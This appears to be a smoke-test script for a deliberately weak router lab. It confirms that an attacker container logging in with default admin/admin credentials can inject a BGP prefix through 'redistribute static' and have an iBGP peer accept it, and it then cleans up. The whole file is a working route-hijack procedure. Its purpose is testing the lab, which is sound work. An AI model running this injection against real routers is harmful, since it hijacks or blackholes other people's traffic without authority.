#!/usr/bin/env bash
# L3 surface probe. iBGP between site routers carries the lab's intra-AS
# routes alongside OSPF. With vendor-default trust between peers (no
# password, no prefix-list, no max-prefix), a visitor on any router can
# announce arbitrary prefixes and the rest of the AS will accept them.
# Same pattern as OSPF route injection but over TCP/179.
#
# Coverage:
#   Stage 0  skip if bgpd isn't running (lab needs a redeploy)
#   Stage 1  iBGP session inet-dmz-fw <-> dmz-ent-fw is Established
#   Stage 2  visitor injects 198.51.100.0/24 via static + redistribute static
#   Stage 3  dmz-ent-fw learns 198.51.100.0/24 as iBGP from 10.10.5.200
#   Stage 4  cleanup: visitor removes the static + redistribute
#   Stage 5  dmz-ent-fw forgets the route
#
# Usage: bash tests/smoke/test_bgp_route_hijack.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
ROUTER_A="10.10.0.200"
ROUTER_B="10.10.5.201"
INJECTED_PREFIX="198.51.100.0/24"
INJECTED_PREFIX_RE='198\.51\.100\.0/24'

require_running "$ATTACKER"
require_running "inet-dmz-fw"
require_running "dmz-ent-fw"

echo "[bgp] Stage 0: bgpd must be running on inet-dmz-fw"
BGP_STATE="$(ssh_password_login "$ATTACKER" admin "$ROUTER_A" admin "show bgp summary")"
if echo "$BGP_STATE" | grep -qE 'BGP router identifier'; then
    ok "inet-dmz-fw has bgpd running"
else
    echo "  [skip] bgpd on inet-dmz-fw not running."
    echo "         Rebuild clab-router image and './ctl down && ./ctl up' to redeploy."
    exit 2
fi

echo "[bgp] Stage 1: iBGP session to dmz-ent-fw is Established"
# BGP keepalive default 60s, hold 180s. After redeploy the session usually
# comes up in 30-60s. Poll the neighbor detail for "BGP state = Established"
# (the summary view shows numeric prefix count once a session is up, so the
# word "Established" only lives in `show bgp neighbor <ip>`).
for _ in $(seq 1 120); do
    NBR="$(ssh_password_login "$ATTACKER" admin "$ROUTER_A" admin "show bgp neighbor 10.10.5.201")"
    echo "$NBR" | grep -qE 'BGP state = Established' && break
    sleep 1
done
assert_contains "$NBR" "remote AS 65000" "dmz-ent-fw configured as iBGP peer"
assert_contains "$NBR" "BGP state = Established" "session to 10.10.5.201 is Established"

# Same vtysh driver as the OSPF test, kept inline so the smoke tests don't
# build up a shared library that paper-trails them together.
vtysh_apply() {
    local host="$1" snippet="$2"
    docker exec "$ATTACKER" "$SSH_RUNNER_PY" -c "
import paramiko, time
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('$host', username='admin', password='admin', timeout=5,
          allow_agent=False, look_for_keys=False)
chan = c.invoke_shell()
def drain(t=0.4):
    time.sleep(t); out = b''
    while chan.recv_ready(): out += chan.recv(16384)
    return out.decode('utf-8', 'replace')
drain(0.5)
for line in '''$snippet'''.strip().splitlines():
    chan.send(line + '\n')
    drain(0.2)
chan.send('end\n'); drain(0.3)
chan.send('show running-config\n')
print(drain(0.6))
c.close()
" 2>&1
}

echo "[bgp] Stage 2: visitor injects $INJECTED_PREFIX via static + redistribute"
INJECT="$(vtysh_apply "$ROUTER_A" "configure terminal
ip route $INJECTED_PREFIX Null0
router bgp 65000
 address-family ipv4 unicast
  redistribute static")"
assert_contains "$INJECT" "ip route $INJECTED_PREFIX_RE" "static route present in running-config"
assert_contains "$INJECT" "redistribute static"          "redistribute static present under address-family"

echo "[bgp] Stage 3: dmz-ent-fw learns the route via iBGP"
for _ in $(seq 1 30); do
    ROUTE_BGP="$(ssh_password_login "$ATTACKER" admin "$ROUTER_B" admin "show ip route bgp")"
    echo "$ROUTE_BGP" | grep -qE "$INJECTED_PREFIX_RE" && break
    sleep 1
done
assert_contains "$ROUTE_BGP" "$INJECTED_PREFIX_RE" "dmz-ent-fw RIB carries $INJECTED_PREFIX via BGP"
assert_contains "$ROUTE_BGP" "10.10.5.200"         "next-hop is inet-dmz-fw"

echo "[bgp] Stage 4: visitor cleans up"
CLEAN="$(vtysh_apply "$ROUTER_A" "configure terminal
router bgp 65000
 address-family ipv4 unicast
  no redistribute static
exit-address-family
exit
no ip route $INJECTED_PREFIX Null0")"
assert_absent "$CLEAN" "redistribute static"          "redistribute static removed from running-config"
assert_absent "$CLEAN" "ip route $INJECTED_PREFIX_RE" "static route removed from running-config"

echo "[bgp] Stage 5: dmz-ent-fw forgets the route"
for _ in $(seq 1 30); do
    POST="$(ssh_password_login "$ATTACKER" admin "$ROUTER_B" admin "show ip route bgp")"
    echo "$POST" | grep -qE "$INJECTED_PREFIX_RE" || break
    sleep 1
done
assert_absent "$POST" "$INJECTED_PREFIX_RE" "dmz-ent-fw no longer carries $INJECTED_PREFIX"

summary
